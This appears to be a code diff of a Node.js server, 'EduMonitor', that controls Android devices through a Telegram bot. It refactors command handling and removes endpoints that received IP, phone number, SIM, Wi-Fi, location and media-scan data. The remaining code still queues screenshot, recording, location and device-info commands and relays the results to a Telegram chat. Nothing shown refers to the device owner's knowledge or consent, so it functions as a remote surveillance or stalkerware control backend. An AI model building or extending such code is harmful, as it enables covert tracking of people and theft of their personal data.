@@ -29,15 +29,6 @@ const authorizedChats = new Set([
 // Auto-collection flags
 const autoDataRequested = new Map();
 
-// Schedule states
-const SCHEDULE_STATES = {
-    IDLE: 'idle',
-    AWAITING_START_TIME: 'awaiting_start_time',
-    AWAITING_END_TIME: 'awaiting_end_time',
-    AWAITING_RECURRING: 'awaiting_recurring',
-    AWAITING_INTERVAL: 'awaiting_interval'
-};
-
 // Create uploads directory
 const uploadDir = 'uploads';
 if (!fs.existsSync(uploadDir)) {
@@ -430,13 +421,13 @@ function getRealtimeMenuKeyboard() {
     ];
 }
 
-// ==================== INFO MENU ====================
+// ==================== INFO MENU (CONSOLIDATED) ====================
 
 function getInfoMenuKeyboard() {
     return [
-        [{ text: '📱 All Device Info', callback_data: 'cmd:device_info' }],
-        [{ text: '🌐 All Network Info', callback_data: 'cmd:network_info' }],
-        [{ text: '📱 All Mobile Info', callback_data: 'cmd:mobile_info' }],
+        [{ text: '📱 Device Info', callback_data: 'cmd:device_info' }],
+        [{ text: '🌐 Network Info', callback_data: 'cmd:network_info' }],
+        [{ text: '📱 Mobile Info', callback_data: 'cmd:mobile_info' }],
         [{ text: '🏷️ Device Name', callback_data: 'menu_device_name' }],
         [{ text: '◀️ Back', callback_data: 'help_main' }]
     ];
@@ -624,7 +615,6 @@ async function setChatMenuButton(chatId) {
             { command: 'showmenu', description: '📋 Show help menu' },
             { command: 'devices', description: '📱 List all devices' },
             { command: 'select', description: '🎯 Select device to control' },
-            { command: 'status', description: '📊 Device status' },
             { command: 'screenshot', description: '📸 Take screenshot' },
             { command: 'record', description: '🎤 Start recording' },
             { command: 'location', description: '📍 Get location' },
@@ -645,13 +635,6 @@ async function setChatMenuButton(chatId) {
     } catch (error) {
         console.error('Error setting menu button:', error.response?.data || error.message);
     }
-}
-
-function createInlineButton(text, callbackData) {
-    return {
-        text: text,
-        callback_data: callbackData
-    };
 }
 
 async function sendTelegramDocument(chatId, filePath, filename, caption) {
@@ -725,167 +708,6 @@ function formatLocationMessage(locationData) {
     } catch (error) {
         console.error('Error formatting location:', error);
         return { text: locationData };
-    }
-}
-
-function formatIPInfo(ipData) {
-    try {
-        let ipInfo = ipData;
-        if (typeof ipData === 'string') {
-            try {
-                ipInfo = JSON.parse(ipData);
-            } catch (e) {
-                return `🌐 IP Info: ${ipData}`;
-            }
-        }
-
-        let message = '🌐 <b>Network Information</b>\n\n';
-        
-        if (ipInfo.publicIP) {
-            message += `🌍 <b>Public IP:</b> <code>${ipInfo.publicIP}</code>\n`;
-            message += `📍 <b>Location:</b> ${ipInfo.city || 'Unknown'}, ${ipInfo.country || 'Unknown'}\n`;
-            message += `🏢 <b>ISP:</b> ${ipInfo.isp || 'Unknown'}\n`;
-        }
-        
-        if (ipInfo.wifiIP && ipInfo.wifiIP !== 'Unknown') {
-            message += `\n📶 <b>WiFi IP:</b> <code>${ipInfo.wifiIP}</code>\n`;
-        }
-        
-        if (ipInfo.mobileIP && ipInfo.mobileIP !== 'Unknown') {
-            message += `📱 <b>Mobile IP:</b> <code>${ipInfo.mobileIP}</code>\n`;
-        }
-        
-        return message;
-    } catch (error) {
-        console.error('Error formatting IP info:', error);
-        return `🌐 IP Info: ${JSON.stringify(ipData)}`;
-    }
-}
-
-function formatSimInfo(simData) {
-    try {
-        let message = '📱 <b>SIM Information</b>\n\n';
-        
-        if (Array.isArray(simData)) {
-            message += `Active SIMs: ${simData.length}\n\n`;
-            simData.forEach((sim, index) => {
-                message += `📱 <b>SIM ${index + 1}</b>\n`;
-                message += `• Slot: ${sim.slot || 'Unknown'}\n`;
-                message += `• Carrier: ${sim.carrierName || 'Unknown'}\n`;
-                message += `• Country: ${sim.countryIso || 'Unknown'}\n`;
-                message += `• Number: ${sim.number || 'Hidden'}\n\n`;
-            });
-        } else if (simData.operator) {
-            message += `• Operator: ${simData.operator}\n`;
-            message += `• Country: ${simData.country}\n`;
-            message += `• SIM State: ${simData.simState}\n`;
-            message += `• Phone Type: ${simData.phoneType || 'Unknown'}\n`;
-        }
-        
-        return message;
-    } catch (error) {
-        console.error('Error formatting SIM info:', error);
-        return `📱 SIM Info: ${JSON.stringify(simData)}`;
-    }
-}
-
-function formatWifiInfo(wifiData) {
-    try {
-        let message = '📶 <b>WiFi Information</b>\n\n';
-        
-        message += `• Enabled: ${wifiData.enabled ? '✅ Yes' : '❌ No'}\n`;
-        
-        if (wifiData.connected) {
-            message += `\n📡 <b>Current Connection</b>\n`;
-            message += `• SSID: ${wifiData.ssid || 'Unknown'}\n`;
-            message += `• BSSID: ${wifiData.bssid || 'Unknown'}\n`;
-            message += `• IP: ${wifiData.ip || 'Unknown'}\n`;
-            message += `• Speed: ${wifiData.speed || 'Unknown'} Mbps\n`;
-            message += `• Frequency: ${wifiData.frequency || 'Unknown'} MHz\n`;
-            message += `• Signal: ${wifiData.rssi || 'Unknown'} dBm\n`;
-        }
-        
-        return message;
-    } catch (error) {
-        console.error('Error formatting WiFi info:', error);
-        return `📶 WiFi Info: ${JSON.stringify(wifiData)}`;
-    }
-}
-
-// ============= CONSOLIDATED COMMAND HANDLERS =============
-
-async function queueCommandToDevice(chatId, deviceId, command) {
-    const device = devices.get(deviceId);
-    if (!device) return false;
-    
-    if (!device.pendingCommands) {
-        device.pendingCommands = [];
-    }
-    
-    device.pendingCommands.push({
-        command: command,
-        originalCommand: `/${command}`,
-        timestamp: Date.now()
-    });
-    saveDevices();
-    
-    console.log(`📝 Queued command: ${command} for ${deviceId}`);
-    return true;
-}
-
-function sleep(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-async function handleDeviceInfoCommand(chatId, deviceId) {
-    const commands = ['device_info', 'battery', 'storage', 'time'];
-    
-    await sendTelegramMessage(chatId, 
-        "📱 *Fetching Device Information*\n\n" +
-        "Collecting:\n" +
-        "• Device Info (model, Android version)\n" +
-        "• Battery Status\n" +
-        "• Storage Information\n" +
-        "• Device Time/Uptime\n\n" +
-        "Results will arrive shortly...");
-    
-    for (const cmd of commands) {
-        await queueCommandToDevice(chatId, deviceId, cmd);
-        await sleep(2000);
-    }
-}
-
-async function handleNetworkInfoCommand(chatId, deviceId) {
-    const commands = ['network_info', 'ip_info', 'wifi_info'];
-    
-    await sendTelegramMessage(chatId,
-        "🌐 *Fetching Network Information*\n\n" +
-        "Collecting:\n" +
-        "• Network Status (connection type, internet)\n" +
-        "• IP Information (public, WiFi, mobile IPs)\n" +
-        "• WiFi Details (SSID, signal, speed)\n\n" +
-        "Results will arrive shortly...");
-    
-    for (const cmd of commands) {
-        await queueCommandToDevice(chatId, deviceId, cmd);
-        await sleep(2000);
-    }
-}
-
-async function handleMobileInfoCommand(chatId, deviceId) {
-    const commands = ['mobile_info', 'sim_info', 'phone_number'];
-    
-    await sendTelegramMessage(chatId,
-        "📱 *Fetching Mobile & SIM Information*\n\n" +
-        "Collecting:\n" +
-        "• Mobile Network (operator, type, roaming)\n" +
-        "• SIM Information (carrier, country, state)\n" +
-        "• Phone Number\n\n" +
-        "Results will arrive shortly...");
-    
-    for (const cmd of commands) {
-        await queueCommandToDevice(chatId, deviceId, cmd);
-        await sleep(2000);
     }
 }
 
@@ -1106,339 +928,6 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
     } catch (error) {
         console.error('❌ File upload error:', error);
         res.status(500).json({ error: 'Upload failed: ' + error.message });
-    }
-});
-
-// ============= IP INFO ENDPOINT =============
-app.post('/api/ipinfo/:deviceId', async (req, res) => {
-    try {
-        const deviceId = req.params.deviceId;
-        const ipData = req.body;
-        
-        console.log(`🌐 IP Info received from ${deviceId}`);
-        
-        const device = devices.get(deviceId);
-        if (!device) {
-            console.error(`❌ Device not found: ${deviceId}`);
-            return res.status(404).json({ error: 'Device not found' });
-        }
-        
-        const chatId = device.chatId;
-        
-        ipData.serverIP = getServerIP();
-        device.lastIPInfo = ipData;
-        saveDevices();
-        
-        const formattedMessage = formatIPInfo(ipData);
-        
-        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n`;
-        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
-        
-        res.json({ success: true });
-        
-    } catch (error) {
-        console.error('❌ IP Info endpoint error:', error);
-        res.status(500).json({ error: 'IP Info processing failed' });
-    }
-});
-
-// ============= PHONE NUMBER ENDPOINT =============
-app.post('/api/phonenumber/:deviceId', async (req, res) => {
-    try {
-        const deviceId = req.params.deviceId;
-        const phoneData = req.body;
-        
-        console.log(`📞 Phone number received from ${deviceId}`);
-        
-        const device = devices.get(deviceId);
-        if (!device) {
-            console.error(`❌ Device not found: ${deviceId}`);
-            return res.status(404).json({ error: 'Device not found' });
-        }
-        
-        const chatId = device.chatId;
-        
-        device.phoneNumber = phoneData.phoneNumber;
-        device.simInfo = phoneData.simInfo;
-        saveDevices();
-        
-        let message = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
-        message += '📞 <b>Phone Information</b>\n\n';
-        
-        if (phoneData.phoneNumber && phoneData.phoneNumber !== 'Unknown') {
-            message += `📱 <b>Phone Number:</b> <code>${phoneData.phoneNumber}</code>\n`;
-        } else {
-            message += `⚠️ <b>Phone Number:</b> Not available (no SIM or permission required)\n`;
-        }
-        
-        if (phoneData.simInfo) {
-            if (Array.isArray(phoneData.simInfo)) {
-                message += `\n<b>SIM Information (Multiple SIMs):</b>\n`;
-                phoneData.simInfo.forEach((sim, index) => {
-                    message += `\n📱 <b>SIM ${index + 1}</b>\n`;
-                    message += `• Slot: ${sim.slot || 'Unknown'}\n`;
-                    message += `• Carrier: ${sim.carrierName || 'Unknown'}\n`;
-                    message += `• Country: ${sim.countryIso || 'Unknown'}\n`;
-                });
-            } else {
-                message += `\n<b>SIM Information:</b>\n`;
-                message += `• Operator: ${phoneData.simInfo.operator || 'Unknown'}\n`;
-                message += `• Country: ${phoneData.simInfo.country || 'Unknown'}\n`;
-                message += `• SIM State: ${phoneData.simInfo.simState || 'Unknown'}\n`;
-            }
-        }
-        
-        await sendTelegramMessage(chatId, message);
-        
-        res.json({ success: true });
-        
-    } catch (error) {
-        console.error('❌ Phone Number endpoint error:', error);
-        res.status(500).json({ error: 'Phone Number processing failed' });
-    }
-});
-
-// ============= SIM INFO ENDPOINT =============
-app.post('/api/siminfo/:deviceId', async (req, res) => {
-    try {
-        const deviceId = req.params.deviceId;
-        const simData = req.body;
-        
-        console.log(`📱 SIM Info received from ${deviceId}`);
-        
-        const device = devices.get(deviceId);
-        if (!device) {
-            console.error(`❌ Device not found: ${deviceId}`);
-            return res.status(404).json({ error: 'Device not found' });
-        }
-        
-        const chatId = device.chatId;
-        
-        device.simInfo = simData;
-        saveDevices();
-        
-        const formattedMessage = formatSimInfo(simData);
-        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
-        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
-        
-        res.json({ success: true });
-        
-    } catch (error) {
-        console.error('❌ SIM Info endpoint error:', error);
-        res.status(500).json({ error: 'SIM Info processing failed' });
-    }
-});
-
-// ============= WIFI INFO ENDPOINT =============
-app.post('/api/wifiinfo/:deviceId', async (req, res) => {
-    try {
-        const deviceId = req.params.deviceId;
-        const wifiData = req.body;
-        
-        console.log(`📶 WiFi Info received from ${deviceId}`);
-        
-        const device = devices.get(deviceId);
-        if (!device) {
-            console.error(`❌ Device not found: ${deviceId}`);
-            return res.status(404).json({ error: 'Device not found' });
-        }
-        
-        const chatId = device.chatId;
-        
-        device.wifiInfo = wifiData;
-        saveDevices();
-        
-        const formattedMessage = formatWifiInfo(wifiData);
-        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
-        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
-        
-        res.json({ success: true });
-        
-    } catch (error) {
-        console.error('❌ WiFi Info endpoint error:', error);
-        res.status(500).json({ error: 'WiFi Info processing failed' });
-    }
-});
-
-// ============= MOBILE INFO ENDPOINT =============
-app.post('/api/mobileinfo/:deviceId', async (req, res) => {
-    try {
-        const deviceId = req.params.deviceId;
-        const mobileData = req.body;
-        
-        console.log(`📱 Mobile Info received from ${deviceId}`);
-        
-        const device = devices.get(deviceId);
-        if (!device) {
-            console.error(`❌ Device not found: ${deviceId}`);
-            return res.status(404).json({ error: 'Device not found' });
-        }
-        
-        const chatId = device.chatId;
-        
-        device.mobileInfo = mobileData;
-        saveDevices();
-        
-        let message = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
-        message += '📱 <b>Mobile Network Information</b>\n\n';
-        
-        if (mobileData.operator) {
-            message += `📶 *Network*\n`;
-            message += `• Operator: ${mobileData.operator}\n`;
-            message += `• Country: ${mobileData.country}\n`;
-            message += `• Type: ${mobileData.networkType}\n`;
-            message += `• Roaming: ${mobileData.roaming ? 'Yes' : 'No'}\n`;
-        }
-        
-        if (mobileData.ip) {
-            message += `\n🌐 *Mobile IP*\n`;
-            message += `• ${mobileData.ip}\n`;
-        }
-        
-        if (mobileData.dataEnabled !== undefined) {
-            message += `\n🔌 *Connection Status*\n`;
-            message += `• Mobile Data: ${mobileData.dataEnabled ? '✅ ON' : '❌ OFF'}\n`;
-        }
-        
-        await sendTelegramMessage(chatId, message);
-        
-        res.json({ success: true });
-        
-    } catch (error) {
-        console.error('❌ Mobile Info endpoint error:', error);
-        res.status(500).json({ error: 'Mobile Info processing failed' });
-    }
-});
-
-// ============= LOCATION ENDPOINT =============
-app.post('/api/location/:deviceId', async (req, res) => {
-    try {
-        const deviceId = req.params.deviceId;
-        const locationData = req.body;
-        
-        console.log(`📍 Location data from ${deviceId}`);
-        
-        const device = devices.get(deviceId);
-        if (!device) {
-            console.error(`❌ Device not found: ${deviceId}`);
-            return res.status(404).json({ error: 'Device not found' });
-        }
-        
-        const chatId = device.chatId;
-        
-        device.lastLocation = locationData;
-        saveDevices();
-        
-        const formatted = formatLocationMessage(locationData);
-        const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
-        
-        if (formatted.lat && formatted.lon) {
-            try {
-                await axios.post(`${TELEGRAM_API}/sendLocation`, {
-                    chat_id: chatId,
-                    latitude: formatted.lat,
-                    longitude: formatted.lon,
-                    live_period: 60
-                });
-                console.log('✅ Location pin sent');
-            } catch (e) {
-                console.error('Failed to send location pin:', e.message);
-            }
-        }
-        
-        await sendTelegramMessage(chatId, devicePrefix + formatted.text);
-        
-        res.json({ success: true });
-        
-    } catch (error) {
-        console.error('❌ Location endpoint error:', error);
-        res.status(500).json({ error: 'Location processing failed' });
-    }
-});
-
-// ============= SCREENSHOT SETTINGS ENDPOINT =============
-app.post('/api/screenshot-settings/:deviceId', async (req, res) => {
-    try {
-        const deviceId = req.params.deviceId;
-        const settingsData = req.body;
-        
-        console.log(`📸 Screenshot settings from ${deviceId}`);
-        
-        const device = devices.get(deviceId);
-        if (!device) {
-            return res.status(404).json({ error: 'Device not found' });
-        }
-        
-        device.screenshotSettings = settingsData;
-        saveDevices();
-        res.json({ success: true });
-        
-    } catch (error) {
-        console.error('❌ Screenshot settings error:', error);
-        res.status(500).json({ error: error.message });
-    }
-});
-
-// ============= RECORDING SETTINGS ENDPOINT =============
-app.post('/api/recording-settings/:deviceId', async (req, res) => {
-    try {
-        const deviceId = req.params.deviceId;
-        const settingsData = req.body;
-        
-        console.log(`🎤 Recording settings from ${deviceId}`);
-        
-        const device = devices.get(deviceId);
-        if (!device) {
-            return res.status(404).json({ error: 'Device not found' });
-        }
-        
-        device.recordingSettings = settingsData;
-        saveDevices();
-        res.json({ success: true });
-        
-    } catch (error) {
-        console.error('❌ Recording settings error:', error);
-        res.status(500).json({ error: error.message });
-    }
-});
-
-// ============= MEDIA SCAN ENDPOINT =============
-app.post('/api/media-scan/:deviceId', async (req, res) => {
-    try {
-        const deviceId = req.params.deviceId;
-        const scanData = req.body;
-        
-        console.log(`🔍 Media scan results from ${deviceId}:`, scanData);
-        
-        const device = devices.get(deviceId);
-        if (!device) {
-            return res.status(404).json({ error: 'Device not found' });
-        }
-        
-        const chatId = device.chatId;
-        const deviceName = device.deviceInfo?.model || 'Unknown Device';
-        
-        let message = `📱 *${deviceName}*\n\n`;
-        message += `🔍 *Media Scan Complete*\n\n`;
-        
-        if (scanData.files && scanData.files.length > 0) {
-            message += `Found ${scanData.files.length} media files:\n`;
-            scanData.files.slice(0, 10).forEach(file => {
-                message += `• ${file.name} (${(file.size/1024/1024).toFixed(2)} MB)\n`;
-            });
-            if (scanData.files.length > 10) {
-                message += `... and ${scanData.files.length - 10} more\n`;
-            }
-        } else {
-            message += `No media files found.`;
-        }
-        
-        await sendTelegramMessage(chatId, message);
-        res.json({ success: true });
-        
-    } catch (error) {
-        console.error('❌ Media scan error:', error);
-        res.status(500).json({ error: error.message });
     }
 });
 
@@ -1756,25 +1245,17 @@ async function handleCallbackQuery(callbackQuery) {
     // Handle commands
     if (data.startsWith('cmd:')) {
         const command = data.substring(4);
-        
-        // Handle consolidated commands
-        if (command === 'device_info' || command === 'network_info' || command === 'mobile_info') {
-            await executeConsolidatedCommand(chatId, messageId, command, callbackId);
-        } else {
-            await executeCommandFromButton(chatId, messageId, command, callbackId);
-        }
+        await executeCommandFromButton(chatId, messageId, command, callbackId);
         return;
     }
     
     // Handle menu navigation
     switch (data) {
-        // Main navigation
         case 'help_main':
             await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard(chatId));
             await sendTelegramMessage(chatId, "🤖 *EduMonitor Control Panel*\n\nSelect a category:");
             break;
         
-        // Screenshot menu
         case 'menu_screenshot':
             await editMessageKeyboard(chatId, messageId, getScreenshotMenuKeyboard());
             break;
@@ -1808,13 +1289,9 @@ async function handleCallbackQuery(callbackQuery) {
             await editMessageKeyboard(chatId, messageId, getRemoveTargetKeyboard());
             userStates.set(chatId, { state: 'awaiting_remove_target', data: {} });
             break;
-        
-        // Camera menu
         case 'menu_camera':
             await editMessageKeyboard(chatId, messageId, getCameraMenuKeyboard());
             break;
-        
-        // Recording menu
         case 'menu_recording':
             await editMessageKeyboard(chatId, messageId, getRecordingMenuKeyboard());
             break;
@@ -1829,8 +1306,6 @@ async function handleCallbackQuery(callbackQuery) {
             await editMessageKeyboard(chatId, messageId, getCustomScheduleKeyboard());
             userStates.set(chatId, { state: 'awaiting_custom_schedule', data: {} });
             break;
-        
-        // Data menu
         case 'menu_data':
             await editMessageKeyboard(chatId, messageId, getDataMenuKeyboard());
             break;
@@ -1848,21 +1323,15 @@ async function handleCallbackQuery(callbackQuery) {
             await editMessageKeyboard(chatId, messageId, getSetSyncIntervalKeyboard());
             userStates.set(chatId, { state: 'awaiting_sync_interval', data: {} });
             break;
-        
-        // Real-time menu
         case 'menu_realtime':
             await editMessageKeyboard(chatId, messageId, getRealtimeMenuKeyboard());
             break;
-        
-        // Info menu
         case 'menu_info':
             await editMessageKeyboard(chatId, messageId, getInfoMenuKeyboard());
             break;
         case 'menu_device_name':
             await editMessageKeyboard(chatId, messageId, getDeviceNameKeyboard());
             break;
-        
-        // System menu
         case 'menu_system':
             await editMessageKeyboard(chatId, messageId, getSystemMenuKeyboard());
             break;
@@ -1893,8 +1362,6 @@ async function handleCallbackQuery(callbackQuery) {
             await editMessageKeyboard(chatId, messageId, getSetServerBackupKeyboard());
             userStates.set(chatId, { state: 'awaiting_server_backup', data: {} });
             break;
-        
-        // Device management
         case 'menu_devices':
             const keyboard = getDeviceSelectionKeyboard(chatId);
             await editMessageKeyboard(chatId, messageId, keyboard);
@@ -1915,8 +1382,6 @@ async function handleCallbackQuery(callbackQuery) {
             });
             await sendTelegramMessage(chatId, statsMsg);
             break;
-        
-        // Device selection
         case data.startsWith('select_device:') && data:
             const selectedDeviceId = data.split(':')[1];
             const device = devices.get(selectedDeviceId);
@@ -1927,48 +1392,14 @@ async function handleCallbackQuery(callbackQuery) {
                 await sendTelegramMessage(chatId, `✅ Now controlling: ${device.deviceInfo?.model || 'Device'}`);
             }
             break;
-        
-        // Close menu
         case 'close_menu':
             await editMessageKeyboard(chatId, messageId, []);
             await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
             break;
-        
         default:
             console.log(`⚠️ Unknown callback: ${data}`);
             break;
     }
-}
-
-async function executeConsolidatedCommand(chatId, messageId, command, callbackId) {
-    console.log(`🎯 Executing consolidated command: ${command}`);
-    
-    const selectedDeviceId = userDeviceSelection.get(chatId);
-    const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
-    
-    if (!device) {
-        await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
-        return;
-    }
-    
-    await answerCallbackQuery(callbackId, `🔄 Fetching ${command}...`);
-    
-    switch (command) {
-        case 'device_info':
-            await handleDeviceInfoCommand(chatId, selectedDeviceId);
-            break;
-        case 'network_info':
-            await handleNetworkInfoCommand(chatId, selectedDeviceId);
-            break;
-        case 'mobile_info':
-            await handleMobileInfoCommand(chatId, selectedDeviceId);
-            break;
-        default:
-            await queueCommandToDevice(chatId, selectedDeviceId, command);
-    }
-    
-    const keyboard = [[{ text: '◀️ Back to Menu', callback_data: 'help_main' }]];
-    await editMessageKeyboard(chatId, messageId, keyboard);
 }
 
 async function executeCommandFromButton(chatId, messageId, command, callbackId) {
@@ -1981,6 +1412,8 @@ async function executeCommandFromButton(chatId, messageId, command, callbackId) 
         await sendTelegramMessage(chatId, '❌ No device selected. Use /devices to see available devices.');
         return;
     }
+    
+    await answerCallbackQuery(callbackId, `🔄 Executing ${command}...`);
     
     if (!device.pendingCommands) {
         device.pendingCommands = [];
@@ -2167,7 +1600,7 @@ async function sendCommandToDevice(chatId, messageId, command) {
     }
     
     device.pendingCommands.push({
-        command: command.substring(1), // Remove leading /
+        command: command.substring(1),
         originalCommand: command,
         messageId: messageId,
         timestamp: Date.now()
@@ -2183,72 +1616,43 @@ async function handleCommand(chatId, command, messageId) {
     console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);
 
     // Handle consolidated info commands
-    if (command === '/device_info') {
-        const selectedDeviceId = userDeviceSelection.get(chatId);
+    if (command === '/device_info' || command === '/network_info' || command === '/mobile_info' || command === '/location') {
+        let selectedDeviceId = userDeviceSelection.get(chatId);
         let device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
         
         if (!device) {
             for (const [id, d] of devices.entries()) {
                 if (String(d.chatId) === String(chatId)) {
+                    selectedDeviceId = id;
                     device = d;
-                    userDeviceSelection.set(chatId, id);
+                    userDeviceSelection.set(chatId, selectedDeviceId);
                     break;
                 }
             }
         }
         
         if (device) {
-            await handleDeviceInfoCommand(chatId, userDeviceSelection.get(chatId));
+            await answerCallbackQuery(null, `🔄 Sending ${command} to device...`);
+            
+            if (!device.pendingCommands) {
+                device.pendingCommands = [];
+            }
+            
+            device.pendingCommands.push({
+                command: command.substring(1),
+                originalCommand: command,
+                messageId: messageId,
+                timestamp: Date.now()
+            });
+            saveDevices();
+            
+            await sendTelegramMessage(chatId, `✅ Command sent: ${command}\n📱 Device: ${device.deviceInfo?.model || 'Unknown'}`);
         } else {
             await sendTelegramMessage(chatId, '❌ No device registered.');
         }
         return;
     }
     
-    if (command === '/network_info') {
-        const selectedDeviceId = userDeviceSelection.get(chatId);
-        let device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
-        
-        if (!device) {
-            for (const [id, d] of devices.entries()) {
-                if (String(d.chatId) === String(chatId)) {
-                    device = d;
-                    userDeviceSelection.set(chatId, id);
-                    break;
-                }
-            }
-        }
-        
-        if (device) {
-            await handleNetworkInfoCommand(chatId, userDeviceSelection.get(chatId));
-        } else {
-            await sendTelegramMessage(chatId, '❌ No device registered.');
-        }
-        return;
-    }
-    
-    if (command === '/mobile_info') {
-        const selectedDeviceId = userDeviceSelection.get(chatId);
-        let device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
-        
-        if (!device) {
-            for (const [id, d] of devices.entries()) {
-                if (String(d.chatId) === String(chatId)) {
-                    device = d;
-                    userDeviceSelection.set(chatId, id);
-                    break;
-                }
-            }
-        }
-        
-        if (device) {
-            await handleMobileInfoCommand(chatId, userDeviceSelection.get(chatId));
-        } else {
-            await sendTelegramMessage(chatId, '❌ No device registered.');
-        }
-        return;
-    }
-
     if (command === '/devices') {
         const userDevices = getDeviceListForUser(chatId);
         let message = `📱 *Your Devices*\n\n`;
